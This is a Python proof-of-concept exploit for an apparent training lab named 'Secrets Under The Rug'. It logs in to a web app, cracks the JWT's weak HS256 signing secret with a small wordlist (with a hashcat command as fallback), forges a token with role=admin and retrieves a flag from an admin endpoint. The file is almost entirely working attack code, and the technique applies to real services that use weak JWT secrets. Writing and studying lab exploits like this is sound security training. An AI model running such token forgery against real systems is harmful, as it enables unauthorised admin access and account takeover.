#!/usr/bin/env python3
"""
Lab #3 - Secrets Under The Rug
Vulnerability : weak HMAC secret (HS256, secret = 'secret') - brute-forceable offline
Attack        : crack the secret, forge a token with role=admin
"""
import argparse, base64, hashlib, hmac, json, sys
import requests
from pwn import log


def parse_args():
    p = argparse.ArgumentParser(description='Lab #3 - Secrets Under The Rug PoC')
    p.add_argument('--url', default='http://localhost:3000', metavar='URL',
                   help='target base URL (default: http://localhost:3000)')
    return p.parse_args()


def b64url_enc(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_dec(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + '=' * (-len(s) % 4))

def hs256_sign(header_b64: str, payload_b64: str, secret: str) -> str:
    msg = f'{header_b64}.{payload_b64}'.encode()
    return b64url_enc(hmac.new(secret.encode(), msg, hashlib.sha256).digest())

def forge_token(payload: dict, secret: str) -> str:
    h = b64url_enc(json.dumps({'alg': 'HS256', 'typ': 'JWT'}, separators=(',', ':')).encode())
    p = b64url_enc(json.dumps(payload, separators=(',', ':')).encode())
    return f'{h}.{p}.{hs256_sign(h, p, secret)}'


WORDLIST = ['password', '123456', 'admin', 'jwt', 'token', 'secret']


def main():
    args = parse_args()
    base_url = args.url.rstrip('/')

    log.info(f'Target: {base_url}')

    r = requests.post(f'{base_url}/api/login', json={'username': 'hacker'}, timeout=5)
    r.raise_for_status()
    token = r.cookies['session']
    log.success(f'Token obtained: {token[:50]}...')

    header_b64, payload_b64, sig_b64 = token.split('.')

    crack = log.progress('Cracking HMAC secret')
    cracked = None
    for candidate in WORDLIST:
        crack.status(repr(candidate))
        if b64url_dec(sig_b64) == hmac.new(
            candidate.encode(), f'{header_b64}.{payload_b64}'.encode(), hashlib.sha256
        ).digest():
            cracked = candidate
            break

    if not cracked:
        crack.failure('not in wordlist - try: hashcat -a 0 -m 16500 token.txt rockyou.txt')
        sys.exit(1)
    crack.success(f"'{cracked}'")

    forged = forge_token({'name': 'hacker', 'role': 'admin'}, cracked)
    log.info(f'Forged token: {forged[:50]}...')

    r = requests.get(f'{base_url}/api/admin/users', cookies={'session': forged}, timeout=5)
    if r.status_code != 200:
        log.failure(f'Unexpected status {r.status_code}: {r.text}')
        sys.exit(1)

    log.success(f'FLAG: {r.json()["flag"]}')


if __name__ == '__main__':
    main()
